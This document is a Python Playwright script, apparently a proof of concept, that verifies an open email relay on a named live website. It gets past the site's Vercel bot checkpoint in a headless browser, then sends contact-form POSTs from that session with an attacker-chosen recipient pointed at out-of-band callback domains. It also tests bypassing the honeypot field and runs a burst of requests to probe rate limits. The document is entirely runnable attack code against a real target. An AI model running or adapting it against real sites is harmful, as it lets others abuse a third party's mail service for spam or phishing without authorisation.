#!/usr/bin/env python3
"""
Independent verification of: unauthenticated open email relay via POST /api/send
Target: https://www.infinitycapital.bh/api/send

Approach:
 1. Launch headless Chromium, solve the Vercel bot challenge (pure browser),
    then read the site's own contact-form JS to learn the real request shape.
 2. Replay the request from inside the SAME browser context (so it carries the
    challenge cookie) and capture full request/response.
 3. Compare two POSTs identical EXCEPT the `targets` field, to an OOB mailbox
    I control => cleanest proof of attacker-controlled recipient.
 4. Repeat a second time to show reliability / no rate limit.
"""
import json, sys, time, re, pathlib

OUT = pathlib.Path("/work/verify3")
OUT.mkdir(parents=True, exist_ok=True)

OOB = "vf-repro-{ts}.oobf94c5d8dacf7.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
OOB2 = "vf-repro-b-{ts}.oast.abhedi.co.in"

from playwright.sync_api import sync_playwright

log = []
def p(*a):
    line = " ".join(str(x) for x in a)
    log.append(line)
    print(line, flush=True)

results = {}

def make_payload(targets):
    return {
        "fname": "IndependentVerifier",
        "lname": "Repro",
        "areacode": "973",
        "tel": "5551234",
        "cname": "probe",
        "subject": "Verifier relay check",
        "msg": "independent verification message",
        "check": "",
        "targets": targets,
    }

with sync_playwright() as pw:
    b = pw.chromium.launch(headless=True, args=["--no-sandbox"])
    ctx = b.new_context(viewport={"width": 1400, "height": 1000})
    page = ctx.new_page()

    reqs = []
    page.on("request", lambda r: reqs.append((r.method, r.url)))
    page.on("console", lambda m: p("CONSOLE:", m.type, m.text[:200]))

    p("--- navigating to contact page ---")
    resp = page.goto("https://www.infinitycapital.bh/contact-us", wait_until="domcontentloaded", timeout=90000)
    p("initial status:", resp.status if resp else None)

    # wait out the Vercel checkpoint (it reloads the page on success)
    for i in range(30):
        time.sleep(2)
        t = page.title()
        if "Vercel" not in t and "Checkpoint" not in page.content()[:4000]:
            break
    p("title after wait:", page.title())
    p("url:", page.url)
    html = page.content()
    (OUT / "page_after_challenge.html").write_text(html)
    p("html len:", len(html))
    if "Vercel Security Checkpoint" in html:
        p("!! STILL CHALLENGED")
    p("xhr seen:", [r for r in reqs if "/api/" in r[1]][:20])

    # dump any JS referencing /api/send
    js_hits = []
    for name, url in reqs:
        pass

    # Directly probe the endpoint from inside the browser page context
    def do_post(targets, label):
        payload = make_payload(targets)
        res = page.evaluate(
            """async (payload) => {
                const r = await fetch('/api/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded',
                              'Accept': 'application/json, text/plain, */*'},
                    body: new URLSearchParams(payload).toString(),
                    credentials: 'include',
                });
                return {status: r.status, hdrs: Object.fromEntries(r.headers.entries()), text: await r.text()};
            }""",
            payload,
        )
        p(f"[{label}] status={res['status']} body={res['text'][:600]}")
        results[label] = {"request_payload": payload, "response": res}
        return res

    p("\n--- A: control, benign-but-distinct recipient (OOB A) ---")
    a = do_post(OOB.format(ts=int(time.time())), "A_oob")

    time.sleep(2)
    p("\n--- B: identical request, DIFFERENT recipient (OOB B) ---")
    bres = do_post(OOB2.format(ts=int(time.time())), "B_oob")

    time.sleep(2)
    p("\n--- C: honeypot `check` filled with a real value (bot mitigation test) ---")
    pl = make_payload(OOB.format(ts=int(time.time()))); pl["check"] = "i-am-a-bot-but-let-me-in"
    res = page.evaluate(
        """async (payload) => {
            const r = await fetch('/api/send', {method:'POST',
              headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json, text/plain, */*'},
              body: new URLSearchParams(payload).toString(), credentials:'include'});
            return {status:r.status, text: await r.text()};
        }""", pl)
    p("[C_honeypot] status=%s body=%s" % (res["status"], res["text"][:600]))
    results["C_honeypot"] = {"request_payload": pl, "response": res}

    p("\n--- D: no rate limit check, 6 rapid requests ---")
    codes = []
    for i in range(6):
        rr = page.evaluate(
            """async (payload) => {
                const r = await fetch('/api/send', {method:'POST',
                  headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json, text/plain, */*'},
                  body: new URLSearchParams(payload).toString(), credentials:'include'});
                return {status:r.status, text: await r.text()};
            }""", make_payload(OOB.format(ts=int(time.time())*100+i)))
        codes.append((rr["status"], rr["text"][:120]))
        p("  burst %d -> %s %s" % (i, rr["status"], rr["text"][:120]))
        time.sleep(0.4)
    results["D_burst"] = codes

    (OUT / "results.json").write_text(json.dumps(results, indent=2))
    ctx.storage_state(path=str(OUT / "storage_state.json"))
    b.close()

(OUT / "run.log").write_text("\n".join(log))
print("\nDONE")
